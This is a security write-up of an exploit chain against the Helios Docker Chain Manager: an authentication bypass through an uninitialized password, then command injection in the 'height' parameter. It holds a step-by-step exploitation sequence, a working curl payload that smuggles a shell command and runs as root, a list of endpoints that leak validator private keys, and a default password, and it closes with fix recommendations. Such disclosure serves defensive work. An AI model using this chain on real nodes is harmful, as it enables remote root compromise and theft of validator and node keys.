# Helios Docker Manager — Auth Bypass + Command Injection Chain
## Proven August 2026 — real execution, not theoretical

## Auth Bypass: `undefined != undefined` = false

**File:** `Helios-Docker-Chain-Manager/utils/middlewares.js`
**Pattern:** Express middleware that checks header-based auth against an uninitialized variable.

```js
// middlewares.js:116-118
if (req.headers[accessCodeKey] != environement.password
 && req.query[accessCodeKey] != environement.password) {
    res.sendStatus(502); // deny
}
```

**Bug:** `environement.password` is `undefined` on fresh install (never set). When attacker sends no `access-code` header, `req.headers['access-code']` is also `undefined`. `undefined != undefined` evaluates to `false` → the `if` block is skipped → **bypass**.

**Detection:** `GET /auth` returns `false` → node is fresh and vulnerable.

**Exploitation:**
1. `POST /auth-subscribe` with `{"password": "pwned123"}` → sets the password (unauthenticated endpoint)
2. Now all subsequent requests with `access-code: pwned123` header pass auth

## Command Injection: `--height=` parameter injection

**File:** `Helios-Docker-Chain-Manager/exposition/POST-execute-db-info.js`

```js
const blockHeight = height && height !== 'latest' ? height : 'latest';
const command = `heliades application-db info --height=${blockHeight}`;
const result = await execWrapperWithRes(command);
```

**Bug:** `blockHeight` comes from `req.body.height` with no sanitization. The `--height=` prefix doesn't prevent injection because shell metacharacters (`;`, `|`, `` ` ``) terminate the flag argument and start a new command.

**Proof (live test, August 2026):**
```bash
curl -X POST http://localhost:18081/execute-db-info \
  -H "access-code: pwned123" \
  -d '{"height": "1; id > /tmp/helios_pwned; echo rce #"}'
# → {"success":true,"output":"rce\n/bin/sh: heliades: command not found"}
# File /tmp/helios_pwned contains: uid=0(root) gid=0(root) groups=0(root)
```

**Other injectable endpoints:**
- `POST-execute-compact-application-db.js` — `execWrapper('heliades application-db compact')` — hardcoded, safe
- `POST-execute-compact-goleveldb.js` — `execWrapper('heliades experimental-compact-goleveldb')` — hardcoded, safe
- `POST-remove-peer.js` — `app.node.removePeer(peerAddress)` — uses non-shell API, safe
- `POST-setup-node-from-backup.js` — `execWrapper('rm -rf ${tempDir}')` — tempDir is server-controlled, safe

## Key Leak Endpoints (post-auth-bypass)
- `GET /download/priv_validator_key.json` — validator private key
- `GET /download/node_key.json` — node identity key
- `GET /download/config.toml` — full node config including peers, seeds, moniker

## Default Password (docker-compose)
`docker-compose-x.js` sets `PASSWORD: "test"` and `walletPassword: "test"` for all docker nodes.
`automation.js` auto-writes this to `.password` on first boot → docker-deployed nodes are NOT vulnerable to the `undefined` bypass (password is already set), but they ARE vulnerable if the attacker knows the password is `test`.

## Fix Recommendations
1. `environement.password` should be initialized to a sentinel, and the check should be `!password || password !== provided` not bare `!=`
2. `/auth-subscribe` must require a one-time setup token from server console output, not be open to unauthenticated requests
3. All `execWrapper`/`execWrapperWithRes` calls with user-controlled input must use `spawn` with args array
4. Rate-limit `/auth-try` more aggressively (currently 10s cooldown, but `/auth-subscribe` has no rate limit)
5. CORS should not be `*` for endpoints that accept `access-code` header